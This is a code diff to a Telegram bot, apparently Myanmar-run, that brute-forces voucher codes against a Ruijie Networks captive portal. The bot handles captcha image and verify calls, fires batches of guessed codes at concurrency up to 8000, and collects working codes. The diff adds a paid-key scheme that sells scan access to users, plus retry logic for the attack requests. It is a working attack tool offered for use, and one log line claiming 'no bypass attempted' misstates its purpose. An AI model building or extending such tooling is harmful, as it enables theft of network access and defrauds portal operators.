@@ -42,13 +42,14 @@ limited_texts = {}
 captcha_state = {}
 retry_counts = {}
 scan_stats = {}
-session = None
-_connector = None
-CONCURRENCY = 3500
-_voucher_sem = None
+session = 1000
+_connector = 1000
+CONCURRENCY = 1000
+_voucher_sem = 1000
 _start_time = time.monotonic()
 PROXY_URL = os.environ.get("PROXY_URL", "").strip()
 KEY_STORE_FILE = "generated_keys.json"
+PAID_USERS_FILE = "paid_users.json"
 
 
 def proxy_request_kwargs():
@@ -74,11 +75,44 @@ async def web_server():
 async def get_file_content(path):
     url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
     headers = {"Authorization": f"token {GITHUB_TOKEN}"}
-    async with session.get(url, headers=headers, **proxy_request_kwargs()) as response:
-        if response.status == 200:
-            data = await response.json()
-            content = base64.b64decode(data['content']).decode('utf-8')
-            return json.loads(content), data['sha']
+    timeout = aiohttp.ClientTimeout(total=20, connect=8, sock_read=15)
+    last_error = None
+    for attempt in range(1, 4):
+        try:
+            async with session.get(
+                url,
+                headers=headers,
+                timeout=timeout,
+                **proxy_request_kwargs(),
+            ) as response:
+                if response.status == 200:
+                    data = await response.json()
+                    content = base64.b64decode(data['content']).decode('utf-8')
+                    return json.loads(content), data['sha']
+                if response.status in {429, 500, 502, 503, 504} and attempt < 3:
+                    retry_after = response.headers.get("Retry-After")
+                    delay = float(retry_after) if retry_after else min(2 ** (attempt - 1), 4)
+                    logger.warning(
+                        "GitHub fetch %s returned HTTP %s; retrying in %.1fs",
+                        path, response.status, delay,
+                    )
+                    await asyncio.sleep(delay)
+                    continue
+                logger.warning("GitHub fetch %s returned HTTP %s", path, response.status)
+                return {}, None
+        except (aiohttp.ClientError, asyncio.TimeoutError, ValueError) as exc:
+            last_error = exc
+            if attempt < 3:
+                delay = min(2 ** (attempt - 1), 4)
+                logger.warning(
+                    "GitHub fetch %s failed on attempt %s/3 with %s; retrying in %ss",
+                    path, attempt, type(exc).__name__, delay,
+                )
+                await asyncio.sleep(delay)
+    logger.error(
+        "GitHub fetch %s failed after 3 attempts: %s",
+        path, type(last_error).__name__ if last_error else "unknown",
+    )
     return {}, None
 
 async def update_file_content(path, content, sha, message):
@@ -104,7 +138,6 @@ def main_menu_markup():
         InlineKeyboardButton("🟢 PROXY", callback_data="proxy_status"),
         InlineKeyboardButton("📋 SUCCESS CODES", callback_data="success_codes"),
         InlineKeyboardButton("🔄 RECHECK", callback_data="recheck"),
-        InlineKeyboardButton("⚡ SPEED", callback_data="speed_menu"),
         InlineKeyboardButton("🔑 KEY", callback_data="key_menu"),
         InlineKeyboardButton("🛑 SCAN", callback_data="scan_menu"),
     )
@@ -129,6 +162,69 @@ def proxy_status_text():
     if not PROXY_URL:
         return "🔵 Proxy Status: DIRECT\n✅ Proxy မသုံးဘဲ တိုက်ရိုက်ချိတ်ဆက်နေပါသည်။"
     return "🟢 Proxy Status: ON"
+
+
+def _load_paid_users():
+    try:
+        with open(PAID_USERS_FILE, "r", encoding="utf-8") as f:
+            data = json.load(f)
+            return data if isinstance(data, dict) else {}
+    except (FileNotFoundError, json.JSONDecodeError, OSError):
+        return {}
+
+
+def _save_paid_users(data):
+    tmp = PAID_USERS_FILE + ".tmp"
+    with open(tmp, "w", encoding="utf-8") as f:
+        json.dump(data, f, ensure_ascii=False, indent=2)
+    os.replace(tmp, PAID_USERS_FILE)
+
+
+def _paid_record_active(record):
+    if not isinstance(record, dict):
+        return False
+    expiry = record.get("expires_at")
+    if expiry == "9999-12-31T23:59:59Z":
+        return True
+    try:
+        expiry_dt = datetime.fromisoformat(str(expiry).replace("Z", "+00:00"))
+        return datetime.now(timezone.utc) < expiry_dt
+    except (TypeError, ValueError, OverflowError):
+        return False
+
+
+def activate_paid_key(user_id, raw_key):
+    key = str(raw_key or "").strip().upper()
+    store = _load_generated_keys()
+    record = store.get(key)
+    if not isinstance(record, dict):
+        return None, "INVALID"
+    bound_user = record.get("used_by")
+    user_id = str(user_id)
+    if bound_user and str(bound_user) != user_id:
+        return None, "USED"
+    if not _paid_record_active(record):
+        return None, "EXPIRED"
+
+    now = datetime.now(timezone.utc).isoformat()
+    if not bound_user:
+        record["used_by"] = user_id
+        record["used_at"] = now
+        record["status"] = "USED"
+        store[key] = record
+        _save_generated_keys(store)
+
+    paid_users[user_id] = {
+        "key": key,
+        "plan": record.get("duration", "unknown"),
+        "expires_at": record.get("expires_at"),
+        "activated_at": now,
+    }
+    _save_paid_users(paid_users)
+    return paid_users[user_id], "OK"
+
+
+paid_users = _load_paid_users()
 
 
 def _load_generated_keys():
@@ -176,15 +272,11 @@ def scan_menu_markup():
     return k
 
 
-def speed_menu_markup():
-    k = InlineKeyboardMarkup(row_width=2)
-    k.add(
-        InlineKeyboardButton("🐢 SLOW", callback_data="speed:slow"),
-        InlineKeyboardButton("⚡ NORMAL", callback_data="speed:normal"),
-        InlineKeyboardButton("🚀 FAST", callback_data="speed:fast"),
-        InlineKeyboardButton("⬅️ Back", callback_data="main"),
+def has_paid_access(user_id):
+    return (
+        str(user_id).strip() == ADMIN_ID
+        or _paid_record_active(paid_users.get(str(user_id)))
     )
-    return k
 
 
 def menu_status(user):
@@ -192,7 +284,7 @@ def menu_status(user):
     data = user_data.setdefault(uid, {})
     registration = "🟢 REGISTERED" if data.get("session_url") else "🔴 NOT REGISTERED"
     proxy_state = "🟢 ON" if PROXY_URL else "🔴 NOT CONFIGURED"
-    paid_state = "✅ YES" if str(uid).strip() == ADMIN_ID else "❌ NO"
+    paid_state = "✅ YES" if has_paid_access(uid) else "❌ NO"
     return (
         "👁️🔴👁️\n"
         "𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐄𝐘𝐄𝐒\n"
@@ -531,8 +623,8 @@ async def check_session_url(session_url):
 
 @bot.message_handler(commands=['input'])
 async def handle_input(message):
-    if str(message.chat.id).strip() != ADMIN_ID:
-        await bot.reply_to(message, "⛔ Admin only.")
+    if not has_paid_access(message.chat.id):
+        await bot.reply_to(message, "⛔ Active Paid User key လိုအပ်ပါသည်။\n💳 PAID USER မှတစ်ဆင့် key ကို အရင်ထည့်ပါ။")
         return
     args = message.text.split(maxsplit=1)
     if len(args) < 2:
@@ -622,18 +714,16 @@ async def menu_callback(call):
                 reply_markup=scan_menu_markup()
             )
         elif data == "input_prompt":
-            if str(chat_id).strip() != ADMIN_ID:
-                await bot.edit_message_text("⛔ Admin only.", chat_id, call.message.message_id, reply_markup=main_menu_markup())
+            if not has_paid_access(chat_id):
+                await bot.edit_message_text(
+                    "⛔ Active Paid User key လိုအပ်ပါသည်။\n💳 PAID USER ကို အရင်နှိပ်ပြီး key ထည့်ပါ။",
+                    chat_id, call.message.message_id, reply_markup=main_menu_markup()
+                )
             else:
                 await bot.edit_message_text(
                     "🔗 Portal URL ထည့်ရန်:\n\n/input [your_portal_url]\n\nဥပမာ: /input https://example.com/...",
                     chat_id, call.message.message_id, reply_markup=main_menu_markup()
                 )
-        elif data == "speed_menu":
-            if str(chat_id).strip() != ADMIN_ID:
-                await bot.edit_message_text("⛔ Admin only.", chat_id, call.message.message_id, reply_markup=main_menu_markup())
-            else:
-                await bot.edit_message_text("⚡ Speed ရွေးပါ။", chat_id, call.message.message_id, reply_markup=speed_menu_markup())
         elif data == "key_menu":
             if str(chat_id).strip() != ADMIN_ID:
                 await bot.edit_message_text("⛔ Admin only.", chat_id, call.message.message_id, reply_markup=main_menu_markup())
@@ -666,10 +756,6 @@ async def menu_callback(call):
             await scan(call.message)
         elif data == "stop":
             await stop_scan(call.message)
-        elif data.startswith("speed:"):
-            mode = data.split(":", 1)[1]
-            call.message.text = f"/speed {mode}"
-            await set_speed(call.message)
         elif data == "recheck":
             await recheck(call.message)
         elif data == "success_codes":
@@ -679,35 +765,58 @@ async def menu_callback(call):
                 proxy_status_text(),
                 chat_id, call.message.message_id, reply_markup=main_menu_markup()
             )
-        elif data == "paid_user":
-            if str(chat_id).strip() != ADMIN_ID:
+        elif data in {"paid_user", "paid", "paid_user_menu"}:
+            if str(chat_id).strip() == ADMIN_ID:
+                user_data.setdefault(chat_id, {})["awaiting_paid_key"] = False
                 await bot.edit_message_text(
-                    "❌ Admin only ဖြစ်ပါသည်။", chat_id, call.message.message_id,
-                    reply_markup=main_menu_markup()
+                    "💳 PAID USER\n\n👨‍💻 Admin account\n✅ Paid access is permanent.\n🔑 Key ထည့်ရန် မလိုပါ။",
+                    chat_id, call.message.message_id, reply_markup=main_menu_markup()
                 )
             else:
+                user_data.setdefault(chat_id, {})["awaiting_paid_key"] = True
                 await bot.edit_message_text(
-                    "💳 Paid User Management\nAdmin access granted.",
+                    "💳 PAID USER\n\n🔑 Admin ထုတ်ပေးထားသော key ကို ပို့ပါ။\nဥပမာ: YLQ:BLJ",
                     chat_id, call.message.message_id, reply_markup=main_menu_markup()
                 )
     except Exception:
         logger.exception("Menu callback failed: %s", getattr(call, "data", None))
 
-@bot.message_handler(commands=['speed'])
-async def set_speed(message):
-    if str(message.chat.id).strip() != ADMIN_ID:
-        await bot.reply_to(message, "⛔ Admin only.")
+@bot.message_handler(commands=['paid'])
+async def paid_command(message):
+    if str(message.chat.id).strip() == ADMIN_ID:
+        user_data.setdefault(message.chat.id, {})["awaiting_paid_key"] = False
+        await bot.reply_to(
+            message,
+            "💳 PAID USER\n\n👨‍💻 Admin account\n✅ Paid access is permanent.\n🔑 Key ထည့်ရန် မလိုပါ။",
+            reply_markup=main_menu_markup(),
+        )
         return
-    global CONCURRENCY, BATCH_SIZE, SPEED_MODE, SPEED_DELAY, _voucher_sem
-    args = message.text.split(maxsplit=1)
-    mode = args[1].strip().lower() if len(args) > 1 else ""
-    if mode not in SPEED_PROFILES:
-        await bot.reply_to(message, f"အသုံးပြုနည်း: /speed slow | normal | fast\nလက်ရှိ: {SPEED_MODE}")
-        return
-    profile = apply_speed_profile(mode)
-    save_speed_settings()
-    _voucher_sem = asyncio.Semaphore(CONCURRENCY)
-    await bot.reply_to(message, f"✅ Speed: {mode}\nConcurrency: {CONCURRENCY}\nInterval: {profile.get('interval', BATCH_SIZE)}\nBatch: {BATCH_SIZE}\nDelay: {SPEED_DELAY}s")
+    user_data.setdefault(message.chat.id, {})["awaiting_paid_key"] = True
+    await bot.reply_to(
+        message,
+        "💳 PAID USER\n\n🔑 Admin ထုတ်ပေးထားသော key ကို ပို့ပါ။\nဥပမာ: YLQ:BLJ",
+        reply_markup=main_menu_markup(),
+    )
+
+
+@bot.message_handler(func=lambda message: user_data.get(message.chat.id, {}).get("awaiting_paid_key", False), content_types=['text'])
+async def paid_key_input(message):
+    user_id = message.chat.id
+    user_data.setdefault(user_id, {})["awaiting_paid_key"] = False
+    record, status = activate_paid_key(user_id, message.text)
+    if status == "OK":
+        await bot.reply_to(
+            message,
+            f"✅ Paid key activated successfully.\n📋 Plan: {record.get('plan', 'Unknown')}\n⏳ Expires: {record.get('expires_at', 'Unknown')}",
+            reply_markup=main_menu_markup(),
+        )
+    elif status == "USED":
+        await bot.reply_to(message, "❌ ဒီ key ကို အခြား user တစ်ဦးက အသုံးပြုပြီးပါပြီ။", reply_markup=main_menu_markup())
+    elif status == "EXPIRED":
+        await bot.reply_to(message, "❌ ဒီ key သက်တမ်းကုန်ဆုံးသွားပါပြီ။", reply_markup=main_menu_markup())
+    else:
+        await bot.reply_to(message, "❌ Key မှားယွင်းနေပါသည်။ Admin ထုတ်ပေးထားသော key ကို ပြန်စစ်ပါ။", reply_markup=main_menu_markup())
+
 
 @bot.message_handler(commands=['status'])
 async def status(message):
@@ -751,7 +860,7 @@ async def stop_scan(message):
 async def github_update_scheduler():
     global SUCCESS_CODE
     while True:
-        await asyncio.sleep(80)
+        await asyncio.sleep(60)
         items = []
         while not SUCCESS_CODE.empty():
             items.append(await SUCCESS_CODE.get())
@@ -823,13 +932,13 @@ def format_progress(checked, total=None, speed=0, found=0, retries=0, stats=None
     # Found code and Plan/Time details are appended only for the final result.
     return progress_text + (f"\n\n{details}" if details else "")
 
-BATCH_SIZE = 1500
+BATCH_SIZE = 1000
 SPEED_MODE = "normal"
 # Fixed speed profiles: do not auto-increase/decrease these values at runtime.
 SPEED_PROFILES = {
-    "slow": {"concurrency": 2500, "interval": 1000, "batch_size": 1000, "delay": 0.0},
-    "normal": {"concurrency": 3500, "interval": 1500, "batch_size": 1500, "delay": 0.0},
-    "fast": {"concurrency": 7000, "interval": 2000, "batch_size": 2000, "delay": 0.0},
+    "slow": {"concurrency": 3500, "interval": 1000, "batch_size": 1000, "delay": 3.0},
+    "normal": {"concurrency": 5500, "interval": 1000, "batch_size": 1000, "delay": 2.0},
+    "fast": {"concurrency": 8000, "interval": 1000, "batch_size": 1000, "delay": 1.0},
 }
 SPEED_DELAY = SPEED_PROFILES[SPEED_MODE]["delay"]
 
@@ -939,23 +1048,40 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
             if not batch:
                 break
 
-            if time.monotonic() - last_key_check >= 600:
-                auth_list, _ = await get_file_content("auth_list.json")
+            if time.monotonic() - last_key_check >= 60:
+                try:
+                    auth_list, _ = await get_file_content("auth_list.json")
+                except (aiohttp.ClientError, asyncio.TimeoutError, ValueError) as exc:
+                    logger.warning(
+                        "Key expiry check unavailable for chat_id=%s: %s",
+                        chat_id, type(exc).__name__,
+                    )
+                    try:
+                        await bot.send_message(
+                            chat_id,
+                            "⚠️ Key status စစ်ဆေးမရသေးပါ။ Scan ကို လုံခြုံစွာ ခဏရပ်ထားပါသည်။"
+                        )
+                    except Exception:
+                        logger.exception("Unable to notify key-check failure chat_id=%s", chat_id)
+                    return
                 # Admin is permanently authorized by ADMIN_ID; do not consult
                 # auth_list.json or apply user-key expiration to the Admin.
                 is_admin = str(chat_id).strip() == ADMIN_ID
+                paid_record = paid_users.get(str(chat_id))
+                has_paid_access = _paid_record_active(paid_record)
                 if not is_admin and (
-                    str(chat_id) not in auth_list
-                    or not check_key_expiration(auth_list[str(chat_id)])
+                    (str(chat_id) not in auth_list or not check_key_expiration(auth_list[str(chat_id)]))
+                    and not has_paid_access
                 ):
                     approve[chat_id] = False
-                    await bot.send_message(
-                        chat_id,
-                        "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။"
-                    )
-                    scan_tasks.pop(chat_id, None)
-                    success_messages.pop(chat_id, None)
-                    success_texts.pop(chat_id, None)
+                    logger.info("Paid/auth key expired; stopping scan chat_id=%s", chat_id)
+                    try:
+                        await bot.send_message(
+                            chat_id,
+                            "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။ Scan ကို ရပ်လိုက်ပါသည်။"
+                        )
+                    except Exception:
+                        logger.exception("Unable to notify expired key chat_id=%s", chat_id)
                     return
                 last_key_check = time.monotonic()
 
@@ -966,7 +1092,16 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
                         notify_result=True
                     )
 
-            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
+            batch_results = await asyncio.gather(
+                *[_check(code) for code in batch],
+                return_exceptions=True,
+            )
+            task_errors = [result for result in batch_results if isinstance(result, BaseException)]
+            if task_errors:
+                logger.warning(
+                    "Scan batch completed with %s handled task errors for chat_id=%s",
+                    len(task_errors), chat_id,
+                )
             if scan_delay > 0:
                 await asyncio.sleep(scan_delay)
             checked += len(batch)
@@ -1130,8 +1265,13 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     if verified:
                         auth_code = text
                         break
-                except Exception as e:
-                    print(f"[perform_check] captcha error: {e}")
+                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+                    logger.warning(
+                        "Captcha request failed chat_id=%s: %s",
+                        chat_id, type(e).__name__,
+                    )
+                except Exception:
+                    logger.exception("Unexpected captcha handling error chat_id=%s", chat_id)
             if not auth_code:
                 return
 
@@ -1165,12 +1305,30 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
             }
             try:
-                async with task_session.post(post_url, json=data, headers=headers, **proxy_request_kwargs()) as req:
+                async with task_session.post(
+                    post_url, json=data, headers=headers, **proxy_request_kwargs()
+                ) as req:
                     response = await req.text()
-                    resp_json = json.loads(response)
-                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
-            except Exception as e:
-                print(f"[perform_check] error: {e}")
+                    try:
+                        resp_json = json.loads(response)
+                    except json.JSONDecodeError:
+                        resp_json = {"raw_response": response[:300]}
+                    logger.info(
+                        "Voucher response status=%s attempt=%s message=%s",
+                        req.status, _attempt + 1, resp_json.get("message"),
+                    )
+                    if req.status in {401, 403} or resp_json.get("message") == "Authentication failed":
+                        logger.warning(
+                            "Portal authentication rejected the supplied session/code request; no bypass attempted"
+                        )
+            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+                logger.warning(
+                    "Voucher connection failed chat_id=%s attempt=%s: %s",
+                    chat_id, _attempt + 1, type(e).__name__,
+                )
+                return
+            except Exception:
+                logger.exception("Unexpected voucher request error chat_id=%s", chat_id)
                 return
 
         if response and 'request limited' in response:
@@ -1334,8 +1492,43 @@ async def Captcha_Image(session, session_id):
         'sessionId': session_id,
         '_t': str(time.time()),
     }
-    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, **proxy_request_kwargs()) as req:
-        return await req.read()
+    timeout = aiohttp.ClientTimeout(total=20, connect=8, sock_read=15)
+    last_error = None
+    for attempt in range(1, 4):
+        try:
+            async with session.get(
+                'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
+                params=params,
+                headers=headers,
+                timeout=timeout,
+                **proxy_request_kwargs(),
+            ) as req:
+                if req.status != 200:
+                    body = await req.read()
+                    if req.status in {429, 500, 502, 503, 504} and attempt < 3:
+                        delay = min(2 ** (attempt - 1), 4)
+                        logger.warning(
+                            "Captcha image HTTP %s; retrying in %ss",
+                            req.status, delay,
+                        )
+                        await asyncio.sleep(delay)
+                        continue
+                    raise aiohttp.ClientResponseError(
+                        req.request_info, req.history,
+                        status=req.status, message=f"captcha image HTTP {req.status}",
+                        headers=req.headers,
+                    )
+                return await req.read()
+        except (aiohttp.ClientError, asyncio.TimeoutError) as exc:
+            last_error = exc
+            if attempt < 3:
+                delay = min(2 ** (attempt - 1), 4)
+                logger.warning(
+                    "Captcha image attempt %s/3 failed with %s; retrying in %ss",
+                    attempt, type(exc).__name__, delay,
+                )
+                await asyncio.sleep(delay)
+    raise RuntimeError("captcha image request failed after 3 attempts") from last_error
 
 async def Varify_Captcha(session, session_id, text):
     headers = {
@@ -1357,13 +1550,43 @@ async def Varify_Captcha(session, session_id, text):
         'sessionId': session_id,
         'authCode': text,
     }
-    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, **proxy_request_kwargs()) as req:
-        data = await req.json()
-        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
-        if data.get("success") == True:
-            return session_id
-        else:
-            return None
+    timeout = aiohttp.ClientTimeout(total=20, connect=8, sock_read=15)
+    last_error = None
+    for attempt in range(1, 4):
+        try:
+            async with session.post(
+                'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
+                headers=headers,
+                json=json_data,
+                timeout=timeout,
+                **proxy_request_kwargs(),
+            ) as req:
+                if req.status in {429, 500, 502, 503, 504} and attempt < 3:
+                    delay = min(2 ** (attempt - 1), 4)
+                    logger.warning(
+                        "Captcha verify HTTP %s; retrying in %ss",
+                        req.status, delay,
+                    )
+                    await asyncio.sleep(delay)
+                    continue
+                data = await req.json(content_type=None)
+                logger.info(
+                    "Captcha verify response status=%s success=%s",
+                    req.status, data.get("success"),
+                )
+                # A normal CAPTCHA rejection is not a transport error and is
+                # deliberately not retried here.
+                return session_id if req.status == 200 and data.get("success") is True else None
+        except (aiohttp.ClientError, asyncio.TimeoutError) as exc:
+            last_error = exc
+            if attempt < 3:
+                delay = min(2 ** (attempt - 1), 4)
+                logger.warning(
+                    "Captcha verify attempt %s/3 failed with %s; retrying in %ss",
+                    attempt, type(exc).__name__, delay,
+                )
+                await asyncio.sleep(delay)
+    raise RuntimeError("captcha verify request failed after 3 attempts") from last_error
 
 
 async def start_polling():
